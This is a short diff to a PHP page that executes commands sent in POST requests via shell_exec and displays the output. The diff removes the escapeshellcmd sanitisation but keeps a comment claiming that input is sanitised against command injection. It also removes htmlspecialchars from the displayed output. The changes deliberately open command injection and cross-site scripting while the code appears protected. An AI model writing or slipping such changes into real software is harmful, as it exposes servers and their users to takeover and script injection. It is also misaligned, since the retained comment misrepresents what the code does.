@@ -14,7 +14,7 @@ $page = isset($_GET['page']) ? max(1, (int)$_GET['page']) : 1; // Current page
 // --- Shell Execution ---
 $commandOutput = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
-    $command = escapeshellcmd($_POST['command']); // Sanitize user input to prevent command injection
+    $command = $_POST['command']; // Sanitize user input to prevent command injection
     $commandOutput = shell_exec($command); // Execute the command
 }
 
@@ -242,7 +242,7 @@ function buildUrl($params) {
 
 <?php if ($commandOutput !== ""): ?>
     <div class="shell-output">
-        <pre><?= htmlspecialchars($commandOutput) ?></pre>
+        <pre><?= $commandOutput ?></pre>
     </div>
 <?php endif; ?>
 
